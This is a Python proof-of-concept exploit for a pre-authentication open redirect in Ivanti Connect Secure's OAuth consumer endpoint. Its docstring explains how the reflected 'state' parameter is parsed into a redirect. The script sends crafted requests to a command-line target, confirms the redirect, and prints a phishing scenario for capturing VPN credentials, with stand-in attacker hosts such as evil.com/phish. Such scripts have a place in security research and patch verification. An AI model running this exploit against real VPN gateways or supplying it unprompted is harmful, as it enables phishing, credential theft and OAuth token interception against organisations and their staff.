#!/usr/bin/env python3
"""
Ivanti Connect Secure — Pre-Auth Open Redirect via OAuth OIDC Reflection (ZD-18)

Vulnerability:
  oauth-consumer.cgi (pre-auth) makes a curl request to localhost:7300 (OIDC service)
  with the user-controlled 'state' parameter. The OIDC service reflects the state
  value in its error response:
    {"message": "Targeturl not found for the state <STATE_VALUE>"}

  oauth-consumer.cgi then extracts the URL using insecure string parsing:
    index($out, "http")  → finds first "http" in response
    rindex($out, '"')    → finds last quote
    substr(...)          → extracts everything between

  The extracted URL is passed to:
    CGI::redirect(groom_url($targetURL, DONT_REMOVE_HOSTNAME))

  Since DONT_REMOVE_HOSTNAME preserves external hostnames, the attacker controls
  the redirect destination.

Impact:
  - Pre-auth phishing: redirect users to fake VPN login page to steal credentials
  - OAuth token theft: if chained with OAuth flow, can intercept authorization codes
  - Session hijacking: redirect to attacker page that captures Referer with session tokens

Prerequisite:
  - OIDC service must be running on localhost:7300 (enabled when OAuth/OIDC is configured)
  - Common in enterprise deployments using Azure AD, Okta, or other OAuth providers

Usage:
  python3 poc_oauth_open_redirect.py https://target.com
  python3 poc_oauth_open_redirect.py https://target.com http://evil.com/phish
"""

import requests
import urllib3
import sys

urllib3.disable_warnings()


def test_redirect(target, redirect_to="http://evil.example.com/redirect-test"):
    """Test the pre-auth open redirect via OAuth OIDC reflection"""
    url = f"{target}/dana-na/auth/oauth-consumer.cgi"
    params = {"state": redirect_to}

    print(f"[*] Testing: {url}?state={redirect_to}")
    print()

    try:
        r = requests.get(url, params=params, verify=False, timeout=15,
                         allow_redirects=False)

        print(f"  Status: {r.status_code}")
        print(f"  Location: {r.headers.get('Location', 'N/A')}")

        if r.status_code == 302:
            loc = r.headers.get("Location", "")
            if redirect_to.split("//")[1].split("/")[0] in loc:
                print()
                print(f"  [!!!] OPEN REDIRECT CONFIRMED!")
                print(f"  [!!!] User will be redirected to: {loc}")
                print()
                print(f"  Attack scenario:")
                print(f"    1. Attacker sends link to victim:")
                print(f"       {target}/dana-na/auth/oauth-consumer.cgi?state={redirect_to}")
                print(f"    2. Victim clicks → Ivanti redirects to {redirect_to}")
                print(f"    3. Attacker page mimics VPN login → captures credentials")
                return True
            else:
                print(f"  Redirect to different location (not our target)")
                return False
        elif r.status_code == 200:
            if "Invalid" in r.text or "error" in r.text.lower():
                print(f"  OIDC not running or state not reflected (got error page)")
                print(f"  Body: {r.text[:150]}")
            else:
                print(f"  Unexpected 200 response")
            return False
        else:
            print(f"  Unexpected status code")
            return False

    except Exception as e:
        print(f"  Error: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [redirect_url]")
        print(f"  Example: {sys.argv[0]} https://vpn.company.com")
        print(f"  Example: {sys.argv[0]} https://vpn.company.com http://evil.com/phish")
        sys.exit(1)

    target = sys.argv[1].rstrip("/")
    redirect_to = sys.argv[2] if len(sys.argv) > 2 else "http://evil.example.com/redirect-test"

    print()
    print("  Ivanti ICS Pre-Auth Open Redirect (ZD-18)")
    print("  via OAuth OIDC State Reflection")
    print()

    test_redirect(target, redirect_to)
